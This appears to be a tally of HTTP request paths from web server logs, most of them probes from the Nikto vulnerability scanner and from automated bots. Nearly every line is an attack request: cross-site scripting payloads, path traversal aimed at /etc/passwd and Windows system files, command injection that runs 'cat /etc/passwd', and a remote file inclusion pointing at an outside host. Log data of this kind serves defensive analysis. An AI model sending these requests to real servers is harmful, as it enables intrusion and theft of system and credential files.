1,/submit.php?subject=<script>alert('Vulnerable')</script>&story=<script>alert('Vulnerable')</script>&storyext=<script>alert('Vulnerable')</script>&op=Preview
1,/oc/Search/sqlqhit.asp
1,htmlscript?../../../../../../../../../../etc/passwd
1,/mambo/index.php?Itemid=7JxZx
1,/domlog.nsf
1,/chat/!nicks.txt
1,/atomicboard/index.php?location=../../../../../../../../../../etc/passwd
1,/gxp2120/
1,/exchange/root.asp?acs=anon
1,"/administrator/gallery/uploadimage.php?directory=\""<script>alert(document.cookie)</script>"
1,/cgi-bin/ezboard.cgi
1,/isapi/testisa.dll?check1=<script>alert(document.cookie)</script>
1,/TvLBvkHh.dbm
1,info2www
1,/TvLBvkHh.dbc
1,"/administrator/gallery/view.php?path=\""<script>alert(document.cookie)</script>"
1,/IDSWebApp/IDSjsp/Login.jsp
1,/jsp/jspsamp/jspexamples/viewsource.jsp?source=../../../../../../../../../../boot.ini
1,/exchange/lib/RENDER.INC
5,/phpMyAdmin/_scripts/setup.php
1,view-source
1,/phpmyadmin/index.php
1,/examples/servlets/index.html
1,"/vgn/login/1,501,,00.html?cookieName=x--\>"
1,/index.php3
2,/cgi-bin/cgiwrap/~ftp
1,/exchange/lib/JSATTACH.INC
1,/scripts/tools/dsnform
1,/forums/browse.php?fid=3&tid=46&go=<script>JavaScript:alert('Vulnerable');</script>
1,/TvLBvkHh.x-shop
1,/tvcs/getservers.exe?action=selects1
1,auth_data/auth_user_file.txt
1,"/msadm/site/index.php3?authid=\""><script>alert('Vulnerable')</script>"
1,cal_make.pl?p0=../../../../../../../../../../etc/passwd%00
1,/TvLBvkHh.inc
1,common.php?f=0&ForumLang=../../../../../../../../../../etc/passwd
1,htsearch?config=foofighter&restrict=&exclude=&method=and&format=builtin-long&sort=score&words=
3,//phpmyadmin/scripts/setup.php
1,*
1,/asp/SQLQHit.asp
1,/TvLBvkHh.ini
1,/page.cgi?../../../../../../../../../../etc/passwd
1,"/cgi-bin/tst.bat%7Cdir%20..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C,"
1,/TvLBvkHh.pdf
1,/servlet/ContentServer?pagename=<script>alert('Vulnerable')</script>
1,/scgi-bin/
5,/phpMyAdmin1/scripts/setup.php
1,webplus?about
1,/cgi-bin/anacondaclip.pl?template=../../../../../../../../../../etc/passwd
1,/inc/common.load.php
1,/cgi-bin/mail
1,/oc/Search/SQLQHit.asp
1,/cgi-bin/query
1,/cgi-bin/shopper.cgi?newpage=../../../../../../../../../../etc/passwd
2,cgiwrap/~www
1,/TvLBvkHh.pl
1,/TvLBvkHh.pm
1,mt-static/mt-load.cgi
1,zml.cgi?file=../../../../../../../../../../etc/passwd%00
5,/admin/scripts/setup.php
1,/cgi-bin/infosrch.cgi
1,/TvLBvkHh.zip
1,/TvLBvkHh.pw
1,"login.pl?course_id=\"">&lt;SCRIPT&gt;alert('Vulnerable')&lt;/SCRIPT&gt;"
1,sbcgi/sitebuilder.cgi
1,/TvLBvkHh.xml
1,/TvLBvkHh.00RelNotes
5,/mysql/scripts/setup.php
1,/modules.php?op=modload&name=Sections&file=index&req=viewarticle&artid=
1,/vgn/ac/index
1,dbman/db.cgi?db=no-db
1,/nsn/..%5Cutil/send.bas
1,/cgi-bin/perl
1,store/agora.cgi?page=whatever33.html
1,/TvLBvkHh.xtp
1,/servlets/SchedulerTransfer
1,/cgi-bin/.cobalt/alert/service.cgi?service=<script>alert('Vulnerable')</script>
1,/a_security.htm
2,/index.aspx
1,/TvLBvkHh
1,/vgn/errors
1,/ROADS/cgi-bin/search.pl?form=../../../../../../../../../../etc/passwd%00
1,/wp-includes/SimplePie/ogi.exe
1,/userinfo.php?uid=1;
2,/.well-known/security.txt
1,/examples/servlet/AUX
1,lastlines.cgi?process
1,/cgi-bin/DCShop/orders/orders.txt
1,/index.php?option=search&searchword=<script>alert(document.cookie);</script>
1,/cgi-bin/webplus?script=../../../../../../../../../../etc/passwd
2,/admin/phpMyAdmin/index.php
1,ss
1,/scripts/samples/details.idc
1,/%3F.jsp
1,/TvLBvkHh.config
1,/cgi-local/cgiemail-1.6/cgicso?query=<script>alert('Vulnerable')</script>
1,/cgi-bin/guestbook.cgi
1,/cgi-bin/index.js0x70
1,"/phpBB/viewtopic.php?t=17071&highlight=\"">\""<script>javascript:alert(document.cookie)</script>"
1,/_mem_bin/remind.asp
1,/provisioning/spa/
5,/dbadmin/scripts/setup.php
1,/showcat.php?catid=&lt;Script&gt;JavaScript:alert('Vulnerable');&lt;/Script&gt;
1,/chassis/config/GeneralChassisConfig.html
2,horde/test.php
5,MsmMask.exe?mask=/junk334
2,/cgi-bin/cgiwrap/~adm
1,/TvLBvkHh.bak
1,/TvLBvkHh.bat
1,/cgi-bin/zml.cgi?file=../../../../../../../../../../etc/passwd%00
1,webmail/html/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/TvLBvkHh.bas
1,/cgi-bin/db4web_c/dbdirname//etc/passwd
1,/TvLBvkHh.gif
1,/TvLBvkHh.UploadServlet
1,/adm/config.php
1,/help/
1,/nav/cList.php?root=</script><script>alert('Vulnerable')/<script>
1,/TvLBvkHh.tml
1,/supporter/index.php?t=updateticketlog&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;
1,/guestbook/guestbookdat
1,/vgn/performance/TMT/Report/XML
1,bannereditor.cgi
1,/cgi-bin/mkplog.exe
1,/phpMyAdmin/phpMyAdmin/index.php
1,"athcgi.exe?command=showpage&script='],[0,0]];alert('Vulnerable');a=[['"
1,ws_ftp.ini
1,"/SiteServer/Knowledge/Default.asp?ctr=\""><script>alert('Vulnerable')</script>"
1,"alibaba.pl%7Cdir%20..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C,"
1,/TvLBvkHh.tmp
1,/shopping300.mdb
1,store/index.cgi?page=../../../../../../../../etc/passwd
1,/cgi-bin/viewcvs.cgi/viewcvs/?cvsroot=<script>alert('Vulnerable')</script>
1,/cbms/realinv.php
1,/cgi-bin/probecontrol.cgi?command=enable&username=cancer&password=killer
1,/TvLBvkHh.var
1,title.cgi
1,/TvLBvkHh.bas:ShowVolume
1,/index.php?catid=&lt;script&gt;alert('Vulnerable')&lt;/script&gt;
1,/webcart/config/clients.txt
1,/search/htx/sqlqhit.asp
1,/spa/
1,finger.pl
1,htgrep?file=index.html&hdr=/etc/passwd
1,/typo3conf/
1,viralator.cgi
1,/cgi-bin/finger.pl
1,/cgi-bin/guestbook.pl
1,mrtg.cgi?cfg=../../../../../../../../etc/passwd
1,/TvLBvkHh.exe%7Cdir
1,mt/mt.cfg
1,/tftp/
1,/vgn/jsp/jspstatus56
1,opendir.php?/etc/passwd
1,/TvLBvkHh.listprint
1,"/modules/Forums/bb_smilies.php?bgcolor1=\""><script>alert('Vulnerable')</script>"
1,/cgi-bin/echo.bat?&dir+c:\\
1,/TvLBvkHh.iso-ru
1,/hidden.nsf
1,/trace.axd
1,/shopdbtest.asp
1,/cfide/Administrator/startstop.html
1,/billing/billing.apw
1,/TvLBvkHh.cmd
1,smartsearch.cgi?keywords=|/bin/cat%20/etc/passwd|
1,/cgi/cfdocs/expeval/ExprCalc.cfm?OpenFilePath=c:\winnt\win.ini
1,/mpcsoftweb_guestbook/database/mpcsoftweb_guestdata.mdb
1,visadmin.exe
1,badmin.cgi
1,/cgi-bin/visadmin.exe
1,viewsource?/etc/passwd
1,/COM
2,/LOGIN.PWD
1,/view_source.jsp
9,/phpmyadmin/scripts/setup.php
1,/nsn/fdir.bas:ShowVolume
1,/cgi-bin/calendar_admin.pl?config=|cat%20/etc/passwd|
1,/vgn/performance/TMT/reset
1,search.pl?form=../../../../../../../../../../etc/passwd%00
3,/w00tw00t.at.blackhats.romanian.anti-sec:)
1,/cgi-915/
1,/add_user.php
1,/cgi-bin/test.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\
1,/nsn/fdir.bas
1,/TvLBvkHh.org
1,/phpmyadmin0/index.php
1,/cgi-bin/multihtml.pl?multi=/etc/passwd%00html
1,/cgi-bin/auth_data/auth_user_file.txt
1,/TvLBvkHh.csc
1,listrec.pl
1,.access
1,"/cgi-bin/login.pl?course_id=\"">&lt;SCRIPT&gt;alert('Vulnerable')&lt;/SCRIPT&gt;"
1,/cgi-bin/nph-showlogs.pl?files=../../&filter=.*&submit=Go&linecnt=500&refresh=0
1,/phoneprov.conf/
1,"/Page/1,10966,,00.html?var=<script>alert('Vulnerable')</script>"
1,/vgn/asp/status
1,/TvLBvkHh.PRINT
1,/TvLBvkHh.csp
1,blog/mt.cfg
1,/cgi-bin/store/index.cgi?page=../../../../../../../../etc/passwd
1,/setup.exe?<script>alert('Vulnerable')</script>&page=list_users&user=P
1,/servlet/SchedulerTransfer
1,/cgi-bin/empower?DB=whateverwhatever
1,/asp/sqlqhit.asp
1,/cgi-bin/SGB_DIR/superguestconfig
1,/cfdocs/exampleapp/email/getfile.cfm?filename=c:\boot.ini
1,astrocam.cgi
1,/modules/Forums/bb_smilies.php?Default_Theme=<script>alert('Vulnerable')</script>
1,/samples/search.dll?query=<script>alert(document.cookie)</script>
1,/cgi-bin/test-env
1,/cgi-bin/bizdb1-search.cgi
1,/guestbook/guestbook.html
1,/VoIP_SIP.html
1,/nph-showlogs.pl?files=../../../../../../../../etc/&filter=.*&submit=Go&linecnt=500&refresh=0
1,/%3Cscript%3Ealert('Vulnerable')%3C/script%3E.shtm
1,/html/chatheader.php?mainfile=anything&Default_Theme='<script>alert(document.cookie);</script>
1,calendar
1,/TvLBvkHh.TPF
1,/cgi-bin/faxsurvey?cat%20/etc/passwd
2,/cgi-bin/cgiwrap/~mysql
1,/ssi/envout.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\
7,/pma/scripts/setup.php
1,/%00
1,/wp-includes/
1,"/phpwebsite/index.php?module=search&SEA_search_op=continue&PDA_limit=10\""><script>alert('Vulnerable')</script>"
1,"/downloads/pafiledb.php?action=download&id=4?\""&lt;script&gt;alert('Vulnerable')&lt;/script&gt;\"""
1,/modules.php?op=modload&name=Xforum&file=<script>alert('Vulnerable')</script>&fid=2
1,/cgi-bin/generate.cgi?content=../../../../../../../../../../windows/win.ini%00board=board_1
1,/cgi-local/cgiemail-1.6/cgicso?query=AAA
1,wwwadmin.pl
3,//phpMyAdmin/scripts/setup.php
1,sewse?/home/httpd/html/sewse/jabber/comment2.jse+/etc/passwd
1,/modules.php?op=modload&name=DMOZGateway&file=index&topic=<script>alert('Vulnerable')</script>
1,/cartcart.cgi
1,/nsn/..%5Cutil/del.bas
1,/cab/top.shtml
1,/.perf
1,mkilog.exe
1,/cgi-bin/viewsource?/etc/passwd
1,/TvLBvkHh.class
1,/junk999.asp
1,/vgn/legacy/save
1,/cgi-bin/gm-cplog.cgi
1,/cgi-bin/
1,/contents.php?new_language=elvish&mode=select
1,/cgi-bin/webmap.cgi
1,/TvLBvkHh.Htm
1,/pt/
1,"/nice%20ports,/Trinity.txt.bak"
1,/TvLBvkHh.EXE
1,websendmail
2,cgiwrap/~sshd
1,/html/cgi-bin/cgicso?query=<script>alert('Vulnerable')</script>
1,/%3C/a%3E%3Cscript%3Ealert(%22xss%22)%3C/script%3E
1,/cgi-bin/generate.cgi?content=../../../../../../../../../../etc/passwd%00board=board_1
1,/index.html~
1,com5.java
1,/vgn/vr/Saving
1,stats/statsbrowse.asp?filepath=c:\&Opt=3
1,af.cgi?_browser_out=.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2Fetc%2Fpasswd
1,"/administrator/popups/sectionswindow.php?type=web&link=\""<script>alert(document.cookie)</script>"
1,/scripts/iisadmin/bdir.htr
1,/TvLBvkHh.html+
1,/cgi-bin/htsearch?-c/nonexistant
1,/athenareg.php?pass=%20;cat%20/etc/passwd
1,/linksys/
1,/index.php?dir=<script>alert('Vulnerable')</script>
2,/cgi-bin/cgiwrap/~nobody4
1,loadpage.cgi?user_id=1&file=../../../../../../../../../../etc/passwd
1,csGuestBook.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
1,cart32.exe
1,/TvLBvkHh.asp+
1,/modules.php?op=modload&name=News&file=index&catid=&topic=><script>alert('Vulnerable');</script>;
1,/~/%3Cscript%3Ealert('Vulnerable')%3C/script%3E.asp
1,/CFIDE/probe.cfm
1,mrtg.cfg?cfg=../../../../../../../../etc/passwd
1,/index.php?download=/winnt/win.ini
1,"/phpwebsite/index.php?module=calendar&calendar[view]=day&month=2&year=2003&day=1+%00\""><script>alert('Vulnerable')</script>"
1,/vgn/performance/TMT/Report
1,/wikihome/action/conflict.php?TemplateDir=http://cirt.net/rfiinc.txt?
1,/netutils/whodata.stm?sitename=<script>alert(document.cookie)</script>
1,/servlet/com.unify.servletexec.UploadServlet
1,/phpinfo.php3?VARIABLE=<script>alert('Vulnerable')</script>
1,/tftpboot/
1,/TvLBvkHh.BBoardServlet
1,/ca/..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C/%5C%5Cetc/%5C%5Cpasswd
1,mailnews.cgi
1,/cgi-bin/update.dpgs
1,/horde/test.php
1,shop/auth_data/auth_user_file.txt
1,/cgi-bin/cgiforum.pl?thesection=../../../../../../../../../../etc/passwd%00
1,/cgi-bin/post32.exe%7Cdir%20c:%5C%5C
1,/TvLBvkHh.xml+
1,/pap2t/
1,/log.nsf
1,/scripts/samples/search/simple.idq
1,/TvLBvkHh.aspx
1,DCShop/auth_data/auth_user_file.txt
1,emumail/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/TvLBvkHh.shtml
1,/TvLBvkHh.html~
1,/TvLBvkHh.prf
1,/calendar.php?year=<script>alert(document.cookie);</script>&month=03&day=05
2,/admin/pma/index.php
1,emu/html/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/webtop/wdk/
1,/guestbook/?number=5&lng=%3Cscript%3Ealert(document.domain);%3C/script%3E
1,/cgi-bin/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/vgn/jsp/controller
1,/TvLBvkHh.nn
1,/TvLBvkHh.no
1,/TvLBvkHh.nl
1,/.TvLBvkHh
1,/exchange/lib/LANG.INC
1,/cgi-bin/handler
1,/index.php?l=forum/view.php&topic=../../../../../../../../../etc/passwd
1,/servlet/org.apache.catalina.servlets.WebdavStatus/%3Cscript%3Ealert('Vulnerable')%3C/script%3E
1,/cgi-bin/get32.exe
1,/index.html%20
1,"/search.php?searchfor=\""><script>alert(1776)</script>"
1,/ext.dll?MfcIsapiCommand=LoadPage&page=admin.hts%20&a0=add&a1=root&a2=%5C
1,/phpclassifieds/latestwap.php?url=<script>alert('Vulnerable');</script>
1,/cgi-bin/php.cgi?/etc/passwd
1,/SiteServer/Admin/knowledge/dsmgr/users/GroupManager.asp
1,/scripts/samples/search/author.idq
1,/cgi-bin/addbanner.cgi
1,/nsn/..%5Cutil/ren.bas
1,/cleartrust/ct_logon.asp?CTLoginErrorMsg=<script>alert(1)</script>
1,/inc/config.php
1,/cgi-bin/finger
1,/admin.cgi
1,/vgn/jsp/initialize
1,/webtop/wdk/samples/index.jsp
1,/fpdb/shop.mdb
1,uptime
1,/cgi-bin/technote/main.cgi?board=FREE_BOARD&command=down_load&fileNikto=/../../../../../../../../../../etc/passwd
1,.cobalt
1,/TvLBvkHh.idq
1,/cgi-bin/webplus?about
1,/scripts/Carello/Carello.dll
1,/cgi-bin/publisher/search.cgi?dir=jobs&template=;cat%20/etc/passwd|&output_number=10
1,/mpcgi/
1,/webamil/test.php?mode=phpinfo
1,/TvLBvkHh.ida
1,/TvLBvkHh.idc
1,directorypro.cgi?want=showcat&show=../../../../../../../../../../etc/passwd%00
1,/siteminder/smadmin.html
2,/imp/horde/test.php
1,/TvLBvkHh.htm
1,/%5BSecCheck%5D/..%252f..%252f../ext.ini
1,/admin.html
1,/cgi-bin/sojourn.cgi?cat=../../../../../../../../../../etc/password%00
1,/exchange/lib/ATTACH.INC
1,/cfdocs/snippets/fileexists.cfm
1,/vgn/ac/delete
1,/cgi-bin/formmail.cgi
1,/TvLBvkHh.js0x70
1,/categorie.php3?cid=june
2,cgiwrap/~uucp
1,/cgi-bin/gm.cgi
1,/TvLBvkHh.htw
1,/webcalendar/week.php?eventinfo=<script>alert(document.cookie)</script>
1,/TvLBvkHh.htr
2,//
1,/cgi-bin/store/agora.cgi?page=whatever33.html
1,"/shop/normal_html.cgi?file=&lt;script&gt;alert(\""Vulnerable\"")&lt;/script&gt;"
1,/vgn/asp/style
1,/pma/db_details_importdocsql.php?submit_show=true&do=import&docpath=../
1,/TvLBvkHh.ncf
1,/modules.php?op=modload&name=Web_Links&file=index&l_op=viewlink&cid=<script>alert('Vulnerable')</script>
1,/cgi-bin/webgais
1,gH.cgi
1,/cgi-bin/snorkerz.bat
1,/modules.php?op=modload&name=Members_List&file=index&letter=<script>alert('Vulnerable')</script>
1,/ca//%5C%5C../%5C%5C../%5C%5C../%5C%5C../%5C%5C../%5C%5C../%5C%5Cwindows/%5C%5Cwin.ini
1,/cgi-bin/mailit.pl
1,/webMathematica/MSP?MSPStoreID=../../../../../../../../../../etc/passwd&MSPStoreType=image/gif
1,/cgi-bin/perl.exe
2,/sitemap.xml
1,AT-admin.cgi
1,/cgi-bin/Pbcgi.exe
1,/TvLBvkHh.map
1,/friend.php?op=SiteSent&fname=<script>alert('Vulnerable')</script>
1,/cgi-bin/probecontrol.cgi?command=enable&userNikto=cancer&password=killer
1,/cbms/passgen.php
1,/cgi-bin/.cobalt/message/message.cgi?info=%3Cscript%3Ealert%28%27alert%27%29%3B%3C/script%3E
43,/favicon.ico
1,/TvLBvkHh.htaccess~
1,/clusterframe.jsp
1,/cbms/changepass.php
2,/myadmin/index.php
1,/nsn/..%5Cweb/env.bas
1,/cgi-bin/ezadmin.cgi
1,/siteseed/
1,/bin/
1,"/servlet/custMsg?guestName=<script>alert(\""Vulnerable\"")</script>"
1,/cgi-bin/formmail
1,/oem_webstage/cgi-bin/oemapp_cgi
1,"/phpwebchat/register.php?register=yes&username=OverG&email=<script>alert%20(\""Vulnerable\"")</script>&email1=<script>alert%20(\""Vulnerable\"")</script>"
1,/forums//administrator/config.php
1,/cgi-bin/auction/auction.cgi?action=Sort_Page&View=Search&Page=0&Cat_ID=&Lang=English&Search=All&Terms=<script>alert('Vulnerable');</script>&Where=&Sort=Photo&Dir=
1,/.nsf/../winnt/win.ini
1,/TvLBvkHh.cobalt
1,/cgi-bin/mmstdod.cgi
1,/tcb/files/auth/r/root
1,/cgi-bin/mail/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/cgi-914/
1,/cgi-bin/flexform.cgi
2,/cgi-bin/cgiwrap/~test
1,auction/auction.cgi?action=Sort_Page&View=Search&Page=0&Cat_ID=&Lang=English&Search=All&Terms=<script>alert('Vulnerable');</script>&Where=&Sort=Photo&Dir=
1,/cgi-bin/myguestbook.cgi?action=view
1,/cgi-bin/.access
1,search.cgi?..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini
1,/cgi-bin/.cobalt/alert/service.cgi?service=<img%20src=javascript:alert('Vulnerable')>
1,/vgn/performance/TMT
1,/global.inc
1,/TvLBvkHh.bin
1,fortune
1,/cgi-bin/YaBB.pl?board=news&action=display&num=../../../../../../../../../../etc/passwd%00
1,/pma2012/
1,banner.cgi
1,/cgi-bin/lastlines.cgi?process
1,/cgi-bin/mt-static/mt.cfg
1,/cgi-bin/architext_query.cgi
1,/..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5Cboot.ini
1,foxweb.exe
1,/cgi-bin/wrap.cgi
1,/TvLBvkHh.eml
1,way-board.cgi?db=/etc/passwd%00
1,/?mod=node&nid=some_thing&op=view
1,/cgi-bin/cmd1.exe?/c+dir
1,processit.pl
1,/TvLBvkHh.dpgs
2,/pmd/index.php
1,/cgi-bin/story.pl?next=../../../../../../../../../../etc/passwd%00
1,/.git/config
2,/cgi-bin/cgiwrap/~daemon
34,/style.css
1,/cgi-bin/store.cgi?StartID=../../../../../../../../../../etc/passwd%00.html
1,/cgi-bin/cal_make.pl?p0=../../../../../../../../../../etc/passwd%00
1,guestbook/passwd
1,/cgi-bin/cgicso?query=AAA
1,/pap2/
1,/modules/Forums/bb_smilies.php?name=<script>alert('Vulnerable')</script>
2,/cgi-bin/cgiwrap/~bin
1,/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script>
1,/vgn/ac/edit
1,mt/mt-load.cgi
1,awstats.pl
1,../abyss.conf
1,/TvLBvkHh.TXT
1,/cgi-bin/blog/
1,/modules.php?op=modload&name=0&file=0
1,/servlet/sunexamples.BBoardServlet
1,14all-1.1.cgi?cfg=../../../../../../../../etc/passwd
1,/apps/web/vs_diag.cgi?server=<script>alert('Vulnerable')</script>
1,/cgi-bin/astrocam.cgi
1,/cgi-bin/mt/mt-load.cgi
1,/cgi-bin/FormHandler.cgi?realNikto=aaa&email=aaa&reply_message_template=%2Fetc%2Fpasswd&reply_message_from=sq%40example.com&redirect=http%3A%2F%2Fwww.example.com&recipient=sq%40example.com
2,/phpadmin/index.php
1,calendar.pl
1,mmstdod.cgi
1,/snom300/
1,/webmail/blank.html
1,echo.bat?&dir+c:\\
1,/admin/system_footer.php
1,/phones/
1,/currentsetting.htm
1,talkback.cgi?article=../../../../../../../../etc/passwd%00&action=view&matchview=1
1,netauth.cgi?cmd=show&page=../../../../../../../../../../etc/passwd
1,/webcart/config/
1,addbanner.cgi
1,/chat/data/usr
1,/TvLBvkHh.adjunct
1,/cgi-bin/FormHandler.cgi?realname=aaa&email=aaa&reply_message_template=%2Fetc%2Fpasswd&reply_message_from=sq%40example.com&redirect=http%3A%2F%2Fwww.example.com&recipient=sq%40example.com
1,/cgi-bin/handler.cgi
2,cgiwrap/~smtp
3,//myadmin/scripts/setup.php
1,/scripts/root.exe?/c+dir+c:\+/OG
2,/modules.php?name=Downloads&d_op=viewdownload
1,/members.asp?SF=%22;}alert(223344);function%20x(){v%20=%22
1,/cgi-bin/perlshop.cgi
1,/SiteServer/Admin/knowledge/persmbr/VsTmPr.asp
1,/cgi-bin/wais.pl
1,/TvLBvkHh.jsp
1,bigconf.cgi?command=view_textfile&file=/etc/passwd&filters=
1,/TvLBvkHh.link
1,/iissamples/issamples/fastq.idq?CiTemplate=../../../../../../../../../../winnt/win.ini
1,architext_query.pl
1,/scripts/tools/ctss.idc
1,/TvLBvkHh.show_query_columns
1,/TvLBvkHh.jse
1,/TvLBvkHh.www_acl
1,/asterisk/phoneprov/
1,/TvLBvkHh.jsa
1,/phoneprov/
1,search.cgi?..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini
1,/junk999.asp%5C
1,/forum_members.asp?find=%22;}alert(9823);function%20x(){v%20=%22
1,/phprocketaddin/?page=../../../../../../../../../../boot.ini
1,/cgi/cfdocs/expeval/ExprCalc.cfm?OpenFilePath=c:\windows\win.ini
1,way-board/way-board.cgi?db=/etc/passwd%00
1,/scripts/no-such-file.pl
1,/cgi-bin/mrtg.cgi?cfg=../../../../../../../../etc/passwd
1,db4web_c/dbdirNikto//etc/passwd
1,/servlet/MsgPage?action=test&msg=<script>alert('Vulnerable')</script>
1,/%0A%0A%3Cscript%3Ealert(%5C%22Vulnerable%5C%22)%3C/script%3E.jsp
2,/admin/mysql/index.php
1,/phpmyadmin1/index.php
1,csChatRBox.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
1,/phpmyadmin-old/index.php
1,.cobalt/alert/service.cgi?service=<img%20src=javascript:alert('Vulnerable')>
1,"/administrator/gallery/navigation.php?directory=\""<script>alert(document.cookie)</script>"
1,/SoundBridgeStatus.html
1,/article.php?article=4965&post=1111111111
1,cgiforum.pl?thesection=../../../../../../../../../../etc/passwd%00
1,/ganglia/
1,/../../../../winnt/repair/sam._
1,/nsn/..%5Cutil/dsbrowse.bas
1,/vgn/vr/Deleting
1,/yealink/
1,/shoppingdirectory/midicart.mdb
1,/launch.jsp?NFuse_Application=<script>alert('Vulnerable')</script>
1,/cgi-bin/story/story.pl?next=../../../../../../../../../../etc/passwd%00
1,get32.exe
1,/PDG_Cart/oder.log
1,/ca/..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5Cwinnt/%5C%5Cwin.ini
1,/index.php?page=../../../../../../../../../../etc/passwd
1,/sipura/
1,/esp?PAGE=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
2,/myadmin2/index.php
1,"/search.php?zoom_query=<script>alert(\""hello\"")</script>"
1,/cgi-sys/
1,/polycom/
1,/vgn/ppstats
1,/scripts/
1,/exchange/lib/GETREND.INC
1,/cgi-bin/whois/whois.cgi?lookup=;&ext=/bin/cat%20/etc/passwd
1,/cgi-bin/cgi_process
1,/cgi-bin/gm-authors.cgi
1,/cfg/
1,/imp/horde/test.php?mode=phpinfo
2,pbcgi.cgi?Nikto=Joe%Camel&email=%3CSCRIPT%3Ealert%28%27Vulnerable%27%29%3B%3C%2FSCRIPT%3E
1,/modules/Forums/bb_smilies.php?site_font=}--></style><script>alert('Vulnerable')</script>
1,/cgi-bin/Count.cgi
1,/cgi-bin/technote/main.cgi?board=FREE_BOARD&command=down_load&filename=/../../../../../../../../../../etc/passwd
1,bb-hist.sh?HISTFILE=../../../../../../../../../../etc/passwd
1,probecontrol.cgi?command=enable&userNikto=cancer&password=killer
1,/snom/
1,/administrator/gallery/uploadimage.php
1,pagelog.cgi
1,/phone/
1,/gallery/search.php?searchstring=<script>alert(document.cookie)</script>
1,vq/demos/respond.pl?<script>alert('Vulnerable')</script>
1,/~root
2,/cgi-bin/cgiwrap/~uucp
1,shop/orders/orders.txt
2,/cgi-bin/cgiwrap/~lp
1,/cgi-bin/cgiemail-1.4/cgicso?query=AAA
1,///etc/passwd
1,/cgi-bin/netauth.cgi?cmd=show&page=../../../../../../../../../../etc/passwd
1,/administrator/config.php
2,/cgi-bin/cgiwrap/~guest
1,/................../config.sys
1,/netget?sid=user&msg=300&file=../../../../../../../../../../etc/passwd
1,blog/
1,/.git/index
1,/~root/
1,/cgi-local/
1,/cgi-bin/commerce.cgi?page=../../../../../../../../../../etc/passwd%00index.html
1,/horde/imp/test.php
1,/cfdocs/exampleapp/docs/sourcewindow.cfm?Template=c:\boot.ini
2,/nikto-test-5C00ChAL.html
1,webspirs.cgi?sp.nextform=../../../../../../../../../../etc/passwd
1,/modules.php?letter=%22%3E%3Cimg%20src=javascript:alert(document.cookie);%3E&op=modload&name=Members_List&file=index
1,/TvLBvkHh.lst
1,/https-admserv/bin/index?/<script>alert(document.cookie)</script>
2,cgiwrap/~nobody4
1,/search.php?searchstring=<script>alert(document.cookie)</script>
1,store.cgi?StartID=../../../../../../../../../../etc/passwd%00.html
3,/%00/
1,14all.cgi?cfg=../../../../../../../../etc/passwd
1,/contents/extensions/asp/1
1,shop.cgi?page=../../../../../../../etc/passwd
1,/TvLBvkHh.gz
1,/jamdb/
1,/nosuchurl/%3E%3Cscript%3Ealert('Vulnerable')%3C/script%3E
1,/cgi-bin/search.pl?Realm=All&Match=0&Terms=test&nocpp=1&maxhits=10&;Rank=<script>alert('Vulnerable')</script>
1,csLiveSupport.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
1,/sqlqhit.asp
1,/cgi-bin/wconsole.dll
1,/cfdocs/expeval/exprcalc.cfm?OpenFilePath=c:\boot.ini
1,/farm/libs/modules/tween/tween.min.js
1,/vgn/jsp/errorpage
1,ezadmin.cgi
1,/cgi-bin/aglimpse
1,/TvLBvkHh.home
